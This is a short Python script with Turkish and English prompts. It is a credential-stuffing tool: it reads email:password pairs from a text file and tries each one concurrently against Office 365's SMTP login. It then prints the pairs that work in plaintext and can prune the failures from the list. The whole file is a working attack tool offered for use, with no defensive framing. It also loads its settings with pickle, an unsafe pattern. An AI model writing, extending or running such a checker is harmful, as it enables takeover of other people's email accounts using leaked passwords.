import smtplib
import asyncio
import pickle
from concurrent.futures import ThreadPoolExecutor

successful_attempts = []
failed_attempts = []

def load_and_update_language_choice():
    try:
        with open('lang.pkl', 'rb') as f:
            lang_data = pickle.load(f)
    except FileNotFoundError:
        print("Language file (lang.pkl) not found!")
        exit()

    if lang_data['choice'] == 'null':
        selected_lang = input(f"{lang_data['en']['language_prompt']}\nSeçiminiz / Your Choice: ").strip()

        if selected_lang == '1':
            lang_data['choice'] = 'tr'
            print('Dil başarıyla seçildi!')
        elif selected_lang == '2':
            lang_data['choice'] = 'en'
            print('Language successfully selected!')
        else:
            print("Invalid choice, defaulting to English.")
            lang_data['choice'] = 'en'

        with open('lang.pkl', 'wb') as f:
            pickle.dump(lang_data, f)

    return lang_data[lang_data['choice']]

def check_email_credentials(email, password):
    try:
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()

        server.login(email, password)
        successful_attempts.append((email, password))
        server.quit()
    except smtplib.SMTPAuthenticationError:
        failed_attempts.append((email, password))
    except Exception as e:
        failed_attempts.append((email, password))

async def main():
    lang = load_and_update_language_choice()

    print('\n'+lang['checking']+'\n')

    try:
        with open('mails.txt', 'r') as file:
            lines = file.readlines()
    except:
        print(lang['file_not_found'])
        return

    tasks = []
    loop = asyncio.get_event_loop()

    with ThreadPoolExecutor() as executor:
        for line in lines:
            email, password = line.strip().split(':')
            tasks.append(loop.run_in_executor(executor, check_email_credentials, email, password))

        await asyncio.gather(*tasks)

    print(f"\n{lang['working_accounts']} {len(successful_attempts)}\n")
    for email, password in successful_attempts:
        print(f"{email}:{password}")

    print(f"\n{lang['non_working_accounts']} {len(failed_attempts)}\n")
    for email, password in failed_attempts:
        print(f"{email}:{password}")

    response = input(f"\n{lang['delete_prompt']} ").strip().upper()

    if response == "Y":
        with open('mails.txt', 'w') as file:
            for line in lines:
                email, password = line.strip().split(':')
                if (email, password) not in failed_attempts:
                    file.write(f"{email}:{password}\n")
        print(lang['deleted'])
    else:
        print(lang['not_deleted'])

if __name__ == "__main__":
    asyncio.run(main())
